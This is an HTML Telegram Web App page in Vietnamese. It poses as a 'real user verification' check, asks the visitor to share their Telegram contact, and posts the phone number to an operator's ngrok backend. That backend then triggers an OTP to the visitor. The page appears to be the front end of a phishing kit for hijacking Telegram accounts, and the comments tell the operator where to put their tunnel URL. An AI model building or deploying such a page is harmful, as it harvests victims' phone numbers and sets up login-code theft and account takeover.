<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Minh Người Dùng</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { width: 100%; height: 100vh; background: #0d1117; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
        .app-body { width: 100%; max-width: 400px; padding: 20px; text-align: center; color: white; }
        .btn { width: 100%; padding: 15px; background: #36D1C4; border: none; border-radius: 12px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="app-body">
    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
    <div style="margin-bottom: 30px;">Bạn cần xác nhận mình là người dùng thật!</div>
    <button class="btn" id="shareContact">Xác Nhận</button>
</div>

<script>
    // BẮT BUỘC: Thay link này bằng link HTTPS từ ngrok (ví dụ: https://abcd-1234.ngrok-free.dev)
    const BACKEND_URL = 'https://YOUR_NGROK_LINK.ngrok-free.dev'; 
    
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    document.getElementById("shareContact").addEventListener("click", () => {
        // Kiểm tra xem trình duyệt có hỗ trợ requestContact không
        if (tg.requestContact) {
            document.getElementById("shareContact").textContent = 'Đang xác nhận...';
            tg.requestContact();
        } else {
            alert("Trình duyệt không hỗ trợ chia sẻ liên hệ.");
        }
    });

    // Telegram sẽ trả về dữ liệu contact thông qua sự kiện này
    tg.onEvent('contactRequested', (data) => {
        if (data.status === 'sent') {
            // Lưu ý: Telegram WebApp trả về contact qua data.response hoặc event khác tùy phiên bản
            // Ở đây ta gọi hàm gửi tới VPS
            sendPhoneToServer(data.response.contact.phone_number);
        } else {
            alert("Bạn cần nhấn Cho phép để xác minh.");
            document.getElementById("shareContact").textContent = 'Xác Nhận';
        }
    });

    async function sendPhoneToServer(phone) {
        try {
            const response = await fetch(`${BACKEND_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone })
            });
            const data = await response.json();
            if(data.status === 'otp_sent') {
                alert("Mã OTP đã được gửi!");
            } else {
                alert("Lỗi server: " + data.message);
            }
        } catch (err) {
            alert("Lỗi kết nối HTTPS! Hãy đảm bảo Ngrok đang chạy.");
        }
        document.getElementById("shareContact").textContent = 'Xác Nhận';
    }
</script>
</body>
</html>
